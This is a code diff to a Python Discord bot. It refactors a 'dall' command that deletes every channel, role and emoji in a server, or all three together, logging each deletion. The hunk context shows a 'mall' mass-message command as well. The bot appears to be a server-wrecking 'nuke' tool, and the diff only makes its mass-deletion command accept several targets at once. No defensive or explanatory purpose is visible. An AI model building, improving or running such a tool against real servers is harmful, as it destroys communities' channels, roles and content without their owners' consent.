@@ -88,11 +88,12 @@ async def mall(ctx, *, message):
 
 
 @bot.command()
-async def dall(ctx, condition):
+async def dall(ctx, *conditions):
     """
     Can perform multiple actions that envolve mass deleting
     """
-    if condition.lower() == "channels":
+    conditions = [condition.lower() for condition in conditions]
+    if "channels" in conditions:
         for channel in list(ctx.guild.channels):
             try:
                 await channel.delete()
@@ -102,7 +103,8 @@ async def dall(ctx, condition):
                 print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
 
         print("Action Completed: dall channels")
-    elif condition.lower() == "roles":
+
+    elif "roles" in conditions:
         for role in list(ctx.guild.roles):
             try:
                 await role.delete()
@@ -112,7 +114,8 @@ async def dall(ctx, condition):
                 print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
 
         print("Action Completed: dall roles")
-    elif condition.lower() == "emojis":
+
+    elif "emojis" in conditions:
         for emoji in list(ctx.guild.emojis):
             try:
                 await emoji.delete()
@@ -123,7 +126,7 @@ async def dall(ctx, condition):
 
         print("Action Completed: dall emojis")
 
-    elif condition.lower() == "all":
+    elif "all" in conditions:
         for channel in list(ctx.guild.channels):
             try:
                 await channel.delete()
